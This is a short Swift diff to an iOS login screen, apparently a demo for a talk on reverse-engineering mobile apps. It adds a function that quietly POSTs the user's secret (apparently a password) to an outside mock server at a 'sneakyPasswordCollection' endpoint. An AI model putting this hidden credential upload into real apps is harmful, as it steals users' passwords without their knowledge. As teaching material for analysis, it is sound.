@@ -19,7 +19,19 @@ struct LoginView: View {
     @State var navigate: Bool = false
     
     func sneakilyUploadSecretToServer() {
+        guard let url = URL(string: "https://my-json-server.typicode.com/skn0tt/reverse-engineering-mobile-apps-talk/sneakyPasswordCollection") else {
+          print("Error: cannot create URL")
+          return
+        }
         
+        var urlRequest = URLRequest(url: url)
+        urlRequest.httpMethod = "POST"
+        urlRequest.addValue("text/plain", forHTTPHeaderField: "Content-Type")
+        urlRequest.httpBody = secret.data(using: .utf8)
+        
+        let session = URLSession.shared
+        let task = session.dataTask(with: urlRequest)
+        task.resume()
     }
     
     func handleCommit() {
